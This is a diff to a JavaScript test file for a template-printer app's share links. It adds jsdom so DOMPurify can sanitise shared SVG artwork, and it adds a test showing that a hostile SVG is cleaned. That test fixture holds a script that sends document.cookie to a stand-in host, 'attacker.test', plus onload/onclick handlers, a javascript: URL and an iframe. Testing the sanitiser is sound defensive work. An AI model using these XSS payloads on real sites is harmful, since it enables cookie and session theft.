@@ -19,6 +19,12 @@ const HERE = path.dirname(fileURLToPath(import.meta.url))
 const REFERENCE_DIR = path.resolve(HERE, '../../docs/reference-templates')
 const APP_URL = 'https://projects.ahmadjalil.com/template-printer/'
 
+// DOMPurify needs a real DOM, and refuses to run without one rather than
+// passing untrusted markup through. jsdom gives the tests the genuine article,
+// so what they exercise is the sanitiser itself, not a stub.
+const { JSDOM } = await import('jsdom')
+globalThis.window = new JSDOM('').window
+
 const {
   SHARE_PAYLOAD_VERSION,
   SHARE_URL_MAX_LENGTH,
@@ -99,15 +105,48 @@ await check('compresses the front card to a usable link', () => {
   assert.equal(links.isTooLong, false)
 })
 
-await check('restores the template exactly', async () => {
+await check('restores the template', async () => {
   const target = readShareTarget(new URL(links.edit).hash)
   assert.ok(target, 'the edit link should parse as a share target')
   const restored = await decodeSharedTemplate(target.payload)
-  assert.equal(restored.svg, frontSvg)
+
+  // The artwork is sanitised on the way in, which rewrites the serialisation,
+  // so what has to survive is the content rather than the bytes.
+  const countIn = (markup, pattern) => (markup.match(pattern) || []).length
+  for (const pattern of [/<text/g, /<tspan/g, /<rect/g, /<path/g, /id=/g, /class=/g, /\.cls-\d+[\s,{]/g]) {
+    assert.equal(countIn(restored.svg, pattern), countIn(frontSvg, pattern), `${pattern} survived`)
+  }
+  assert.match(restored.svg, /viewBox="0 0 170.08 260.79"/)
+
   assert.equal(restored.name, 'card-front.svg')
   assert.deepEqual(restored.mappings, payload.mappings)
   assert.deepEqual(restored.fields, payload.fields)
   assert.deepEqual(restored.sampleData, payload.sampleData)
+})
+
+await check('strips anything executable out of a shared template', async () => {
+  // Anyone can hand out a link, and the artwork in it is injected into the page.
+  const hostile = [
+    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">',
+    '  <script>fetch("https://attacker.test/"+document.cookie)</script>',
+    '  <rect width="10" height="10" onload="alert(1)" onclick="alert(2)"/>',
+    '  <a href="javascript:alert(3)"><text id="studentId">123</text></a>',
+    '  <foreignObject><iframe src="https://attacker.test/"></iframe></foreignObject>',
+    '</svg>',
+  ].join('\n')
+
+  const shared = await createShareLinks(
+    buildSharedTemplatePayload({ name: 'hostile.svg', svg: hostile, fields: [], mappings: [] }),
+    APP_URL,
+  )
+  const restored = await decodeSharedTemplate(readShareTarget(new URL(shared.view).hash).payload)
+
+  assert.doesNotMatch(restored.svg, /<script/i, 'no script element')
+  assert.doesNotMatch(restored.svg, /\son\w+\s*=/i, 'no event handlers')
+  assert.doesNotMatch(restored.svg, /javascript:/i, 'no javascript: urls')
+  assert.doesNotMatch(restored.svg, /<iframe/i, 'no nested frames')
+  // The legitimate part of the artwork is still there.
+  assert.match(restored.svg, /id="studentId"/)
 })
 
 await check('view and edit links carry the same payload', () => {
@@ -125,7 +164,9 @@ await check('handles a large artwork-only template', async () => {
   )
   const target = readShareTarget(new URL(large.view).hash)
   const restored = await decodeSharedTemplate(target.payload)
-  assert.equal(restored.svg, backSvg)
+  // The pattern fill is the part most likely to be lost to sanitising.
+  assert.match(restored.svg, /<pattern/)
+  assert.match(restored.svg, /url\(#New_Pattern_6\)/)
   assert.ok(large.isLong, 'a 55 KB artwork should be flagged as a long link')
 })
 
